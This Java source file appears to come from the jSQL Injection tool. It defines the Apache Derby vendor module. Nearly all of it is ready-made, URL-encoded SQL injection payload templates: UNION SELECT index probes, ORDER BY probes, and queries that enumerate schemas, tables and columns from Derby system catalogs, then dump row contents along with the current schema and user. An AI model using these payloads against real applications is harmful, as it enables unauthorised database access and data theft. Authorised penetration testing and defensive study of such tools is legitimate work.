package com.jsql.model.injection.vendor;

import static com.jsql.model.accessible.DataAccess.QTE_SQL;
import static com.jsql.model.accessible.DataAccess.SEPARATOR_SQL;
import static com.jsql.model.accessible.DataAccess.TRAIL_SQL;

import java.util.ArrayList;
import java.util.List;

import com.jsql.model.MediatorModel;
import com.jsql.model.bean.database.Database;
import com.jsql.model.bean.database.Table;
import com.jsql.util.StringUtil;

public class DerbyVendor extends AbstractVendorDefault {

    @Override
    public String sqlInfos() {
        return
            "SELECT+'-'||'"+ SEPARATOR_SQL +"'||CURRENT+SCHEMA"
            + "||'"+ SEPARATOR_SQL +"'||CURRENT_USER||'"+ TRAIL_SQL +"'from+SYSIBM.SYSDUMMY1";
    }

    @Override
    public String sqlDatabases() {
        return
            /**
             * aggreg function return exec fault
             * SELECT item_type FROM SALES where 1=0 union select list(rdb$relation_name,'a')from(select rdb$relation_name from rdb$relations ROWS 2 TO 2)-- 0x0000000100000000
             * => use limit 1,1 instead
             */
            "select+'"+ SEPARATOR_SQL +"'||schemaname||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +""+ TRAIL_SQL +"'FROM+SYS.SYSSCHEMAS{limit}";
    }

    @Override
    public String sqlTables(Database database) {
        return
            "select'"+ SEPARATOR_SQL +"'||trim(tablename)||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +""+ TRAIL_SQL +"'from+sys.systables+t+inner+join+sys.sysschemas+s+on+t.schemaid=s.schemaid+where+schemaname='" + database + "'{limit}";
    }

    @Override
    public String sqlColumns(Table table) {
        return
            "select'"+ SEPARATOR_SQL +"'||trim(columnname)||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +""+ TRAIL_SQL +"'from+sys.systables+t+"
            + "inner+join+sys.sysschemas+s+on+t.schemaid=s.schemaid+"
            + "inner+join+sys.syscolumns+c+on+t.tableid=c.referenceid+"
            + "where+schemaname='" + table.getParent() + "'"
            + "and+tablename='" + table + "'"
            /**
             * TODO casting numeric to string not possible with getValues()
             * => hiding numeric columns
             */
            + "and+columndatatype||''not+like'DOUBLE%'"
            + "and+columndatatype||''not+like'INTEGER%'"
            + "and+columndatatype||''not+like'DECIMAL%'"
            + "and+columndatatype||''not+like'BLOB%'"
            + "{limit}"
            ;
    }

    @Override
    public String sqlRows(String[] columns, Database database, Table table) {
        String formatListColumn = StringUtil.join(columns, ",''))||'%7f'||trim(coalesce(");
        formatListColumn = "trim(coalesce(" + formatListColumn + ",''))";
        
        return
            "SELECT'"+ SEPARATOR_SQL +"'||" + formatListColumn + "||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +""+ TRAIL_SQL +"'from+" + database + "." + table + "{limit}";
    }

    @Override
    public String sqlNormal(String sqlQuery, String startPosition) {
        return
            "select+" +
                /**
                 * If reach end of string (SQLii) then NULLIF nullifies the result
                 */
                 "'SQLi'||NULLIF(substr(" +
                 "(" + sqlQuery + ")," +
                 startPosition + "" +
             "),'"+ TRAIL_SQL +"')from+SYSIBM.SYSDUMMY1";
     }

     @Override
     public String sqlCapacity(String[] indexes) {
         return
             MediatorModel.model().getIndexesInUrl().replaceAll(
                 "1337(" + StringUtil.join(indexes, "|") + ")7331",
                 "(select+'SQLi$1'||'%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23'||'iLQS'from+SYSIBM.SYSDUMMY1)"
             );
     }

    @Override
    public String sqlIndices(Integer nbFields) {
        List<String> fields = new ArrayList<>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("trim(cast((1337"+ i +"7330%2b1)as+char(254)))");
        }
        return "+union+select+" + StringUtil.join(fields.toArray(new String[fields.size()]), ",") + "+from+SYSIBM.SYSDUMMY1--+";
    }

    @Override
    public String sqlOrderBy() {
        return "+order+by+1337--+";
    }

    @Override
    public String sqlLimit(Integer limitSQLResult) {
        return "+OFFSET+" + limitSQLResult + "+ROWS+FETCH+NEXT+1+ROWS+ONLY";
    }
}